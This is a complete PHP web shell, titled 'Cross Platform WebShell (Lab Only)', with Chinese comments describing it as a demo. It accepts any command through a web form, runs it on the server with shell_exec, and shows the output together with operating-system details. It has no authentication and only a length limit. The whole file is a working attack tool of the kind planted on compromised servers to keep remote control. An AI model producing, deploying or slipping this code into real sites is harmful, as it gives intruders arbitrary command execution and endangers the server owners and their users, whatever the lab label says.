<?php
$output = '';
$error  = '';
$sysinfo = php_uname();
$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

if (!empty($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    // 简单长度限制，防止超大命令（演示用）
    if (strlen($cmd) > 1024) {
        $output = "Command too long (max 1024)";
    } else {
        // shell_exec 默认不捕获stderr，使用重定向把错误合并到stdout
        if ($isWindows) {
            $fullCmd = $cmd . " 2>&1";
        } else {
            $fullCmd = $cmd . " 2>&1";
        }
        $output = shell_exec($fullCmd);
        if ($output === null) {
            $output = "No output or command execution failed";
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cross Platform WebShell (Lab Only)</title>
    <style>
        * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }
        body {
            font-family: sans-serif;
            color: rgba(0, 0, 0, .85);
            max-width:900px;
            margin:2rem auto;
            padding:0 15px;
        }
        pre,
        input,
        button {
            padding: 10px;
            border-radius: 6px;
        }
        label {
            display: block;
            margin-bottom:6px;
        }
        input {
            flex:1;
            background-color: #efefef;
            border: 2px solid transparent;
            font-size:14px;
        }
        input:focus {
            outline: none;
            background: #fff;
            border: 2px solid #99ccff;
        }
        button {
            border: none;
            cursor: pointer;
            margin-left: 8px;
            background:#d8e8ff;
        }
        button:hover {
            background-color: #b8d4f8;
        }
        .form-group {
            display: flex;
            padding: 10px 0 20px;
        }
        pre{
            background:#111;
            color:#0f0;
            white-space:pre-wrap;
            word-wrap:break-word;
            overflow-x:auto;
        }
        .info{
            background:#f0f8ff;
            padding:8px 12px;
            border-radius:5px;
            margin-bottom:15px;
        }
    </style>
</head>
<body>
    <h1>Cross Platform Command Exec (Lab)</h1>
    <div class="info">
        <?php
        echo "OS Detected: " . htmlspecialchars(PHP_OS) . "<br>";
        echo "PHP Uname: " . htmlspecialchars($sysinfo);
        ?>
    </div>
    <h2>Execute Command</h2>
    <form method="post">
        <label for="cmd"><strong>Command</strong></label>
        <div class="form-group">
            <input type="text" name="cmd" id="cmd" 
                   value="<?= htmlspecialchars($_POST['cmd'] ?? '', ENT_QUOTES, 'UTF-8') ?>"
                   onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus>
            <button type="submit">Run</button>
        </div>
    </form>
    <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
        <h2>Output</h2>
        <pre><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></pre>
    <?php endif; ?>
</body>
</html>
